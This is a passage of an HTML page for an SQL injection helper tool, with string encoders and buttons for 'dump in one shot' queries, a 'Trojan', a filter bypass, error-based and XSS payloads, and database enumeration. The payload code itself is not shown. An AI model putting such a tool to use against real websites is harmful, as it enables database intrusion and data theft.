var about = alert("Cheatsheet Collection Pakage V.3\n\nBy : Versailles [ Sec7or Team ]\n\nThankz to All Author the queries\n\nI love Mayu Watanabe (Mayuyu AKB48)\n\nGreets :\nM@dbl00d - Minato - Sn00.py -  1DIOT - Sayap Hitam - Penyair - Sanusi - Sohai - i3r_Code - Ajkaro - Zen - Trjnx - Janus - Makman - Kashmiri Cheetah - CodeNinja - UniQue - Cracker Bikash - and All Injector >_<");
}



</script> 
</head>
<body>
<center>

<div class="panel panel-default" style="background:rgba(0,0,0,0.50);width:700px;">

<h1>N19h7h4wk - Sqli Helper Tools</h1>

<br>

<button type="button" class="btn btn-primary collapsed" style="margin-left: 15px;margin-bottom: 10px" data-toggle="collapse" data-target="#mc"><i class="glyphicon glyphicon-plus"></i> STRINGS TOOLS </button> 

<button type="button" class="btn btn-primary collapsed" style="margin-left: 15px;margin-bottom: 10px" data-toggle="collapse" data-target="#q"><i class="glyphicon glyphicon-plus"></i> QUERY </button>


<div id="mc" class="collapse">

<textarea id="str" rows="5" cols="70" placeholder="Strings"></textarea> 
 <br>
<button onclick="Str2Hex()"> Hex </button> 
<button onclick="Hex2Str()"> Unhex </button> 
 | 
<input onclick="b64_enc();" type=button value="Base64Enc" name="encode">
	  <input onclick="b64_dec();" type=button value="Base64Dec" name="decode">
 |
<input onclick="esc();" type=button value="Escape" name="encode">
	  <input onclick="unesc();" type=button value="Unescape" name="decode">

<br><br>
<input type="text" size="25" id="wrd" placeholder="Words"> >>
<input type="text" size="25" id="rep" placeholder="Replace">
<input onclick="rplc();" type=button value="Replace All">
<br><br>

<textarea id="hex" rows="5" cols="70" placeholder="Output">
</textarea><br>

<br>

</div>

<div id="q" class="collapse">
<br>

<button type="button" class="btn btn-primary collapsed" style="margin-left: 15px;margin-bottom: 10px" data-toggle="collapse" data-target="#query"><i class="glyphicon glyphicon-plus"></i> DIOS QUERY </button> 

<button type="button" class="btn btn-primary collapsed" style="margin-left: 15px;margin-bottom: 10px" data-toggle="collapse" data-target="#sysvar"><i class="glyphicon glyphicon-plus"></i> SYSTEM VARIABLES </button> 

<button type="button" class="btn btn-primary collapsed" style="margin-left: 15px;margin-bottom: 10px" data-toggle="collapse" data-target="#otr"><i class="glyphicon glyphicon-plus"></i> OTHER </button> 

<br>
<div id="query" class="collapse"> 

<div class="dios">
<table class="table table-striped table-bordered table-hover datatable">
<tr>
<td class="text-center">
======= :: DUMP IN ONE SHOOT :: =======</td>
</tr>

<tr><td class="text-center">
<button onclick="dios1()">Dios 1</button> 
<button onclick="dios2()">Dios 2</button>
<button onclick="dios3()">Dios 3</button>
<button onclick="dios4()">Dios 4</button>
<button onclick="xssdios()">XssDios </button>
<button onclick="trjn()"> Trojan 1 </button>
<button onclick="trjnx()"> Trojan 2 </button>
<button onclick="bypsfrm()"> Bypass From </button>
</td></tr>

<tr><td class="text-center">
<button onclick="postgre()"> Postgre </button>
<button onclick="mssql()"> Mssql </button>
<button onclick="bof()"> BOF </button>
<button onclick="mydios2()"> Mydios 2 </button>
<button onclick="makman()"> Makman </button>
<button onclick="ebf()"> ErrBased </button>
<button onclick="poligon()"> Poligon </button>
<button onclick="multipoint()"> Multipoint </button>
</td></tr>
</table>
</div>
</div>

<br>

<div id="sysvar" class="collapse"> 

<div class="sv">
<table class="table table-striped table-bordered table-hover datatable">
<tr>
<td class="text-center">
======= :: SYSTEM VARIABLES :: =======</td>
</tr>
</table>
<table class="table table-striped table-bordered table-hover datatable">
<tr><td>VERSION </td><td class="text-center"><button onclick="version1()">Version 1</button>
<button onclick="version2()">Version 2</button>
<button onclick="version3()">Version 3</button>
<button onclick="version4()">Version 4</button>
<button onclick="version5()">Version 5</button>
</td></tr>

<tr><td>USER </td><td class="text-center"><button onclick="user1()">User 1</button>
<button onclick="user2()">User 2</button>
<button onclick="user3()">User 3</button>
<button onclick="user4()">User 4</button>
<button onclick="user5()">User 5</button>
<button onclick="user6()">User 6</button></td></tr>

<tr><td>DATABASE </td><td class="text-center"> <button onclick="db1()">Database 1</button>
<button onclick="db2()">Database 2</button>
<button onclick="db3()">Database 3</button></td></tr>
</table>
</div>


<table class="table table-striped table-bordered table-hover datatable">
<tr><td class="text-center">
<button onclick="o1()"> @@HOSTNAME </button>
<button onclick="o2()"> @@VERSION_COMPILE_MACHINE </button>
<button onclick="o3()"> @@VERSION_COMPILE_OS </button>
</td></tr>

<tr><td class="text-center">
<button onclick="o4()"> @@BASEDIR </button>
<button onclick="o5()"> @@HV_OPENSSL </button>
<button onclick="o6()"> @@HV_SYMLINK </button>
<button onclick="o7()"> @@PORT </button>
<button onclick="o8()"> @@SOCKET </button>
</td></tr>
</table>

</div>



<div id="otr" class="collapse"> 

<div class="othr">
<table class="table table-striped table-bordered table-hover datatable">
<tr>
<td class="text-center">
======= :: OTHERS :: =======</td>
</tr>
</table>

<table class="table table-striped table-bordered table-hover datatable">
<tr><td class="text-center">
<button onclick="xssqli()"> PopUP </button>
<button onclick="kolom()"> Generate Column </button>
<button onclick="mydios()"> MyDios </button>
<button onclick="hx()"> Hex </button>
<button onclick="cn()"> Convert </button>
<button onclick="cs()"> Cast </button>
<button onclick="cp()"> Compress </button>
<button onclick="aes()"> Aes </button>
</td></tr>

<tr><td class="text-center">
<button onclick="dbc()"> Total Databases </button>
<button onclick="tottbl()"> Total Tables </button>
<button onclick="totcol()"> Total Columns </button>
<button onclick="tblc()"> Total Col </button>
<button onclick="countdb()"> Count DB </button>
<button onclick="about()"> About </button>
</td></tr>
</table>

</div></div>

<br>
<textarea id="dios" rows="5" cols="70" placeholder="Output">
</textarea>
<br> 

</div>
<br>

<hr class="hr">
<div id="copy">
&copy; 2016-2018 &hearts; Recoded by <font color="white"><a href=https://facebook.com/fahlevi7.77>N19h7h4wk</a></font> Code by <a href=https://facebook.com/thever.sevenfoldism>Versailles</a><br>
</div>

<style>
 @import url(http://fonts.googleapis.com/css?family=Great+Vibes);
 @import url(http://fonts.googleapis.com/css?family=Inconsolata);
 @import url(http://fonts.googleapis.com/css?family=Geo);
 h1 {
 	color: lime;
 	font-weight: bold;
 	font-family: 'Great Vibes', cursive;
 }
 textarea {
 	background: rgba(0,0,0,0.13);
 	color: lime;
 	border: 1px solid red;
 	font-family: 'Inconsolata', cursive;
 }
 button {
 	border: 1px solid lime;
 	background: black;
 	color: white;
 	font-family: 'Geo', cursive;
 }
 #copy {
 	color: red;
 	font-weight: bold;
 	font-family: 'Inconsolata', cursive;
 }
 #copy a {
 	color: white;
 }
 #copy a:hover {
 	color: blue;
 }
 .text-center {
 	color: red;
 	background: rgba(0,0,0,0.99);
 	font-family: 'Inconsolata', cursive;
 }
 tr {
 	border: 2px solid black;
 	color: lime;
 	font-family: 'Inconsolata', cursive;
 }
 input {
 	background: black;
 	color: white;
 	border: 1px solid lime;
 	font-family: 'Geo', cursive;
 }
 td {
 	background: black;
 	font-family: 'Geo', cursive;
 }
</style>

</div>
</body> 
</html>